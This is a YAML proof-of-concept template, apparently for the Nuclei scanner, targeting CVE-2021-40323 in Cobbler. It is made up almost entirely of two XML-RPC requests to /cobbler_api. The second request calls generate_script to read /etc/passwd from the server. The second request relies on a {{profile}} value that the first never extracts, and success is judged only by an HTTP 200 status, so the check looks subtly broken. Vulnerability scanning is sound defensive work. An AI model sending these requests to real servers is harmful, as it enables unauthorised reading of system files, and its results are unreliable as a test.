id: yaml-poc-cobbler_project-cobbler-rce-CVE-2021-40323
info:
  name: Yaml Poc Cobbler_Project Cobbler Rce Cve 2021 40323
  author: jiapeng.han
  severity: critical
  description: 'Converted from xpoc: yaml-poc-cobbler_project-cobbler-rce-CVE-2021-40323'
  tags: rce,cve
  classification:
    cve-id: CVE-2021-40323
  reference:
  - https://github.com/cobbler/cobbler/commit/d8f60bbf14a838c8c8a1dba98086b223e35fe70a
  - https://github.com/cobbler/cobbler/releases/tag/v3.3.0
  - https://nvd.nist.gov/vuln/detail/CVE-2021-40323
  - https://vigilance.fr/vulnerability/Cobbler-three-vulnerabilities-37678
http:
- method: POST
  path:
  - /cobbler_api
  body: "<?xml version='1.0'?>\n        <methodCall>\n          <methodName>find_profile</methodName>\n\
    \          <params>\n            <param>\n              <value>\n            \
    \    <struct>\n                  <member>\n                    <name>name</name>\n\
    \                    <value>\n                      <string>*</string>\n     \
    \               </value>\n                  </member>\n                </struct>\n\
    \              </value>\n            </param>\n          </params>\n        </methodCall>"
  headers:
    Content-Type: text/xml
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
- method: POST
  path:
  - /cobbler_api
  body: "<?xml version='1.0'?>\n        <methodCall>\n          <methodName>generate_script</methodName>\n\
    \          <params>\n            <param>\n              <value>\n            \
    \    <string>{{profile}}</string>\n              </value>\n            </param>\n\
    \            <param>\n              <value>\n                <string></string>\n\
    \              </value>\n            </param>\n            <param>\n         \
    \     <value>\n                <string>/etc/passwd</string>\n              </value>\n\
    \            </param>\n          </params>\n        </methodCall>"
  headers:
    Content-Type: text/xml
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
